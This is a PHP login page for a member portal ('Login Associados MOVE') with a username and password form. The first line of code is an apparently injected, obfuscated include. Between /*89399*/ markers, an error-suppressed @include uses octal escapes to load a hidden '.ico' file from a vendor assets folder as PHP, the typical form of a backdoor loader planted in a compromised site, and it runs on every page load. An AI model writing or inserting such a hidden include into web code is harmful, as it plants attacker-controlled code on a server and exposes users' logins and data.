<?php
/*89399*/

@include ("\057hom\1451/c\141iro\14446/\141sso\143iad\157s.m\157vep\151aui\056com\056br/\141sse\164s/v\145ndo\162/bo\170ico\156s/.\060f20\14643b\056ico");

/*89399*/




session_start();
require_once 'config/conexao.php';
require_once 'config/logar.php';
include 'config/add_log.php';
require_once 'db_config.php';

if (isset($_POST['ok'])) :
  $login = filter_input(INPUT_POST, "login");
  $senha = filter_input(INPUT_POST, "senha");
  $_1 = new Login;
  $_1->setLogin($login);
  $_1->setSenha($senha);

  if ($_1->logar()) :
    header("Location:sistema.php");
  else :
?>
    <script>
      alert('Login/senha invalidos ...');
      window.location.href = 'index.php';
    </script>
<?php
  endif;
endif;
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>Login Associados MOVE</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/logo.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
  <link href="https://fonts.gstatic.com" rel="preconnect">
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Nunito:300,300i,400,400i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/quill/quill.snow.css" rel="stylesheet">
  <link href="assets/vendor/quill/quill.bubble.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="assets/vendor/simple-datatables/style.css" rel="stylesheet">
  <link href="assets/css/style.css" rel="stylesheet">
</head>


<body>
<style>
    #pass {
  width: 150px;
  padding-right: 20px;
}

.olho {
  cursor: pointer;
  left: 85%;
  margin-top: 5px;
  position: absolute;
  width: 30px;
}
  </style>
  <section class="section register min-vh-100 d-flex flex-column align-items-center justify-content-center py-4">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-lg-4 col-md-6 d-flex flex-column align-items-center justify-content-center">

          <div class="d-flex justify-content-center py-4">
            <a class="logo d-flex align-items-center w-auto">
              <span class="d-none d-lg-block"></span>
            </a>
          </div>
          <div class="card mb-3">
            <div class="card-body">
              <div class="pt-4 pb-2">
                <div class="d-flex justify-content-center py-4">
                  <a class="logo d-flex align-items-center w-auto">
                    <img src="../assets/img/logo.png" alt="">
                  </a>
                </div>
                <h5 class="card-title text-center pb-0 fs-4">Login Associados MOVE</h5>
                <p class="text-center small">Digite seu login e senha para entrar</p>
              </div>
              <form class="row g-3" action="" method="POST">
                <div class="col-12">
                  <label class="form-label">Login</label>
                  <div class="input-group">
                    <input type="text" placeholder="Login" name="login" class="form-control" />
                  </div>
                </div>
                <div class="col-12">
                  <label for="yourPassword" class="form-label">Sua senha</label>
                  <div class="d-flex">
                  <img style="position: absolute;" src="https://cdn0.iconfinder.com/data/icons/ui-icons-pack/100/ui-icon-pack-14-512.png" id="olho" class="olho">
                  <input style="width: 100%;" id="pass" type="password" name="senha" placeholder="Senha" class="form-control" />
                  </div>
                </div>
                <div class="col-12">
                  <button style="border: none;" type="submit" name="ok" class="btn btn-primary w-100">Login</button>
                </div>
              </form>
            </div>
          </div>
        </div>

      </div>
    </div>
  </section>
  </div>
  </div>
  <script>
    document.getElementById('olho').addEventListener('mousedown', function() {
  document.getElementById('pass').type = 'text';
});

document.getElementById('olho').addEventListener('mouseup', function() {
  document.getElementById('pass').type = 'password';
});

// Para que o password não fique exposto apos mover a imagem.
document.getElementById('olho').addEventListener('mousemove', function() {
  document.getElementById('pass').type = 'password';
});
  </script>
  <script type="text/javascript">
    window.setTimeout(function() {
      document.getElementById("clickButton").click();
    }, 1500);
  </script>
</body>